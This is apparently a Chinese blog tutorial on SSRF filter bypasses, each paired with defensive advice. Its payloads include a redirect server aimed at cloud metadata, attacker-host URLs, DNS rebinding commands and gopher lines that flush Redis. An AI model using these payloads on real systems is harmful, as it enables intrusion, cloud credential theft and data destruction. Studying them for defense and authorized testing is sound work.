---
title: SSRF绕过技巧汇总
date: 2025-01-23 10:28:29
tags:
  - Web安全
  - 渗透测试
categories:
  - 渗透测试
description: SSRF 绕过技巧——URL 解析差异、DNS 重绑定、127.0.0.1 变形与 IPv6 绕过。
---

## 前言

SSRF（Server-Side Request Forgery，服务端请求伪造）允许攻击者构造请求，由存在漏洞的服务端代为发起。随着防御手段演进，绕过SSRF限制的技巧也在不断迭代。本文系统梳理实战中的核心绕过方法，每种技法均附代码示例和防御建议。

> **免责声明**：本文仅供安全研究与学习使用，严禁用于非法攻击。因不当使用造成的后果，作者不承担任何责任。

---

## 一、URL解析器差异绕过

不同语言/库对同一URL的解析结果存在差异，攻击者可利用这一差异性绕过黑名单。

```python
from urllib.parse import urlparse
url = "http://evil.com@127.0.0.1:8080/admin"
print(urlparse(url).hostname)  # 127.0.0.1 ——但某些HTTP客户端实际连接 evil.com
```

```java
URL u = new URL("http://127.0.0.1@evil.com/");
System.out.println(u.getHost()); // evil.com —— 与Python结果相反
```

**利用**：构造URL使校验模块鉴定为合法，而底层HTTP客户端连接到另一个hostname。测试反斜杠差异：`http://evil.com\@127.0.0.1/`。

**防御**：使用统一标准解析器，对hostname而非原始字符串做校验。

---

## 二、302重定向绕过

许多防护仅在初始请求时校验URL，不会跟随302跳转后进行二次检查。

```
客户端 -> 受害者服务器（仅校验初始URL） -> 攻击者VPS（302） -> 内网目标
```

```python
# 攻击者VPS部署重定向服务
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/bypass')
def ssrf_redirect():
    return redirect('http://169.254.169.254/latest/meta-data/', code=302)
```

```python
# 受害者服务器 —— allow_redirects=True 且未二次校验即中招
import requests
resp = requests.get("http://attacker-vps.com/bypass", allow_redirects=True, timeout=5)
print(resp.text)  # 泄露云元数据
```

**防御**：显式禁用重定向跟随；若必须跟随，每次跳转后重新解析并校验目标IP。

---

## 三、DNS Rebinding攻击

利用TTL极短的DNS记录，使同一域名在两次DNS查询中分别解析到公网和内网IP——第一次通过校验，第二次直达内网。

```
1. 请求 http://rebind.attacker.com/admin
2. DNS查询#1 -> 1.2.3.4（公网IP，通过白名单）
3. DNS查询#2 -> 127.0.0.1（内网IP，实际请求目标）
```

```bash
sudo rbndr --hostname rebind.attacker.com --ip-first 1.2.3.4 --ip-second 127.0.0.1 --ttl 0
```

**注意**：部分DNS解析器忽略极低TTL，可结合浏览器端 `setTimeout` 触发多次查询。

---

## 四、@字符技巧

URL中 `@` 在RFC中分隔 `userinfo` 与 `host`，不同实现的解读差异可被利用。

```
http://safe.com@127.0.0.1:6379/       # 校验看到 safe.com，实际连 127.0.0.1
http://anything:pass@127.0.0.1:8080/  # cURL 连接 127.0.0.1
http://127.0.0.1:80@evil.com/admin    # 实际连接 evil.com
```

```bash
curl -v "http://anything:pass@127.0.0.1:8080/"  # @前为认证信息，连接 127.0.0.1
```

**防御**：使用标准URL解析库提取hostname，而非正则或字符串分割。

---

## 五、#片段（Fragment）混淆

URL中 `#` 之后的内容不会发送至服务器，但部分校验逻辑未正确截断。

```python
from urllib.parse import urlparse
url = "http://127.0.0.1:6379/flushall#safe-site.com"
parsed = urlparse(url)
print(parsed.hostname)   # 127.0.0.1 —— 实际请求目标
print(parsed.fragment)   # safe-site.com —— 仅干扰检测，不随请求发送
```

**Payload示例**：`http://127.0.0.1/admin#@evil.com`、`http://169.254.169.254/latest/#http://safe.com`

**防御**：校验前统一剥离URL的fragment部分。

---

## 六、127.0.0.1的多种表示方式

黑名单通常仅覆盖 `127.0.0.1` 这一种写法，但IP地址有多种数学等效表示。

### 6.1 十进制整数（2130706433）

```bash
# 计算：127*256^3 + 0*256^2 + 0*256 + 1 = 2130706433
curl http://2130706433/          # 等价于 http://127.0.0.1/
curl http://2130706433:8080/
```

```python
import socket, struct
print(struct.unpack("!I", socket.inet_aton("127.0.0.1"))[0])  # 2130706433
```

### 6.2 八进制：0177.0.0.1

```bash
curl http://0177.0.0.1/          # 0177（八进制）= 127（十进制）
curl http://0177.0.0.0000001/
```

### 6.3 十六进制：0x7f.0.0.1

```bash
curl http://0x7f.0.0.1/          # 0x7f = 127
curl http://0x7f.0x00.0x00.0x01/
curl http://0x7f000001/          # 全十六进制整数
```

### 6.4 IPv6回环

```bash
curl http://[::1]:8080/              # IPv6标准回环
curl http://[0:0:0:0:0:0:0:1]/      # 完整写法
curl http://[::ffff:127.0.0.1]/      # IPv4映射IPv6
curl http://[::FFFF:127.0.0.1]/      # 大小写混淆
```

### 6.5 零号位与简化形式

```bash
curl http://0:8080/              # 部分系统 0 等价 127.0.0.1
curl http://0.0.0.0:8080/
curl http://127.0.1/             # 部分解析器扩展为 127.0.0.1
curl http://127.1/               # 同上
```

### 6.6 localhost变体与通配符DNS

```bash
curl http://localhost/
curl http://LOCALHOST/           # 大小写混淆
curl http://127.0.0.1.nip.io/    # nip.io 通配符DNS
curl http://127.0.0.1.xip.io/    # xip.io 通配符DNS
curl http://localtest.me/        # 固定解析到 127.0.0.1
```

---

## 七、IPv6绕过

大多数SSRF防护仅对IPv4编写匹配规则，完全忽略IPv6地址。

### 7.1 IPv6回环地址

```bash
curl http://[::1]:80/
curl http://[::]:80/
curl -g http://[::1]:6379/admin
```

### 7.2 IPv4-mapped IPv6

```bash
# ::ffff:a.b.c.d 将任意IPv4映射为IPv6
curl http://[::ffff:169.254.169.254]/latest/meta-data/
curl http://[::FFFF:127.0.0.1]:8080/admin
```

### 7.3 接口范围ID

```bash
curl http://[::1%25lo]/         # %lo 本地回环接口
curl http://[::ffff:127.0.0.1%25eth0]/
```

```python
import requests
for url in ["http://[::1]:8080/", "http://[::ffff:127.0.0.1]:8080/"]:
    try: r = requests.get(url, timeout=3); print(f"[OK] {url} -> {r.status_code}")
    except: print(f"[FAIL] {url}")
```

---

## 八、短URL服务绕过

利用短URL服务将内网地址隐藏为短链接，绕过基于文本匹配的检测。

```bash
# 部分短链服务允许指向内网
https://tinyurl.com/xxxxx  ->  http://127.0.0.1:6379/
https://is.gd/xxxxx        ->  http://169.254.169.254/
```

```python
import requests
short_link = "https://is.gd/xxxxx"  # 实际解析至 169.254.169.254
resp = requests.get(short_link, allow_redirects=True)
print(resp.text)  # 泄露云元数据
```

```python
# 自建短链（Flask）
from flask import Flask, redirect; import uuid
app = Flask(__name__); url_map = {}
@app.route('/s/<k>')
def go(k): return redirect(url_map.get(k, 'http://127.0.0.1:6379/'), code=301)
```

**注意**：bit.ly 等主流服务会拒绝内网地址，需寻找无此检测的服务或自建。

---

## 九、通配符DNS（Wildcard DNS）

通用DNS服务将任意子域名解析到嵌在域名中的IP，可绕过仅检测纯IP格式的WAF。

| 服务 | 示例 | 解析结果 |
|------|------|----------|
| nip.io | `127.0.0.1.nip.io` | 127.0.0.1 |
| xip.io | `192.168.1.1.xip.io` | 192.168.1.1 |
| sslip.io | `10.0.0.1.sslip.io` | 10.0.0.1 |

```bash
curl http://127.0.0.1.nip.io:8080/admin
curl http://169.254.169.254.nip.io/latest/meta-data/
curl http://192.168.1.1.sslip.io:6379/
```

**混淆技巧**：

```bash
curl http://legit-cdn.com.attacker.127.0.0.1.nip.io/
curl http://this-is-not-internal.169.254.169.254.nip.io/
```

---

## 十、补充绕过技法

### 10.1 CRLF注入与Unicode同形字符

```bash
# CRLF注入：拆分HTTP请求
curl "http://target.com/%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a" --path-as-is
# Unicode同形字符：Cyrillic 'о' (U+043E) 代替 ASCII 'o'
curl http://lоcalhоst/  # 视觉与 localhost 一致
```

### 10.2 云Metadata端点

```bash
curl http://169.254.169.254/latest/meta-data/                          # AWS (IMDSv1)
curl http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google"  # GCP
curl http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H "Metadata: true"  # Azure
curl http://100.100.100.200/latest/meta-data/                           # 阿里云
```

### 10.3 危险协议利用

```bash
curl gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a   # Redis
curl gopher://127.0.0.1:11211/_stats%0d%0a                      # Memcached
```

---

## 十一、防御建议

1. **URL白名单**：仅允许预定义的外部服务，拒绝一切非白名单目标。
2. **禁用自动重定向**：设置 `follow_redirects=False`；若必须跟随，每次跳转后重新校验目标IP。
3. **DNS解析后校验**：先解析域名为IP，校验IP在公网范围内，再发起连接。
4. **网络层隔离**：出站防火墙拒绝 `10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`、`169.254.0.0/16`。
5. **协议白名单**：仅允许 `http`/`https`，禁用 `file://`、`gopher://`、`dict://`、`ftp://`。
6. **URL规范化**：校验前归一化——去除fragment、解码编码、统一大小写。
7. **IPv6全覆盖**：防护规则必须同时覆盖IPv4和IPv6等效表示。
8. **超时控制**：设置合理的请求超时，防止时序侧信道攻击。

---

## 总结

SSRF绕过的本质是对抗安全校验与实际网络行为之间的不一致性——解析器差异、协议特性、编码技巧以及数值表示等价性都是攻击面。防御应从架构层面（最小权限、网络隔离）入手，而非依赖字符串黑名单。本文所列技巧仅供合法安全测试参考。

> **再次声明**：本文内容仅用于安全研究、漏洞众测（需获授权）和CTF竞赛。任何未经授权的渗透测试均属违法行为，请务必遵守相关法律法规。
